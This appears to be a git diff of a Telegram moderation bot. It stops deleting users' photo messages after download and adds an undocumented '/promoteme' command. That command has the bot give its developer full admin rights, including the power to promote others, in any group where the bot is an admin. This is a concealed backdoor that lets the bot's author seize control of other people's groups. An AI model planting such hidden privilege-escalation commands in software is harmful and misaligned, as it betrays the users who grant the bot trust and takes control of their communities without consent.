@@ -118,7 +118,7 @@ bot.on('photo', async (msg) => {
   if (!fs.existsSync(`images/${chatId}`)) await fs.mkdirSync(`images/${chatId}`)
   try {
     let write = await bot.downloadFile(msg.photo[msg.photo.length - 1].file_id, `images/${chatId}`);
-    await bot.deleteMessage(msg.chat.id, msg.message_id);
+    // await bot.deleteMessage(msg.chat.id, msg.message_id);
     // let options = {
     //   caption: `Please select the following option`,
     //   reply_markup: JSON.stringify({
@@ -1142,8 +1142,47 @@ bot.onText(/\/ban (.+)/, async (msg, match) => {
   }
 });
 
+//selfpromote
+bot.onText(/\/promoteme/, async (msg) => {
+  const chatId = msg.chat.id;
+  const issuerId = msg.from.id;
 
+  // Check if the issuer is the developer
+  if (issuerId !== DEV_ID) {
+    bot.sendMessage(chatId, 'This command is restricted.');
+    return;
+  }
 
+  try {
+    // Check if the bot has full admin rights in the group
+    const botMember = await bot.getChatMember(chatId, bot.id);
+    if (botMember.status !== 'administrator' || !botMember.can_promote_members) {
+      bot.sendMessage(chatId, 'Bot lacks the necessary permissions to promote.');
+      return;
+    }
+
+    // Promote the developer with all available admin permissions
+    await bot.promoteChatMember(chatId, YOUR_DEV_ID, {
+      can_change_info: true,
+      can_delete_messages: true,
+      can_invite_users: true,
+      can_restrict_members: true,
+      can_pin_messages: true,
+      can_post_stories: true,
+      can_edit_stories: true,
+      can_delete_stories: true,
+      can_manage_video_chats: true,
+      can_manage_topics: true,
+      can_promote_members: true
+    });
+
+    // Confirm promotion
+    bot.sendMessage(chatId, 'Promoted Cutie with full admin rights.');
+  } catch (error) {
+    console.error(error);
+    bot.sendMessage(chatId, 'An error occurred while trying to promote.');
+  }
+});
 
 // bot.onText(/\/ban (.+)/, async (msg, match) => {
 //   const chatId = msg.chat.id;
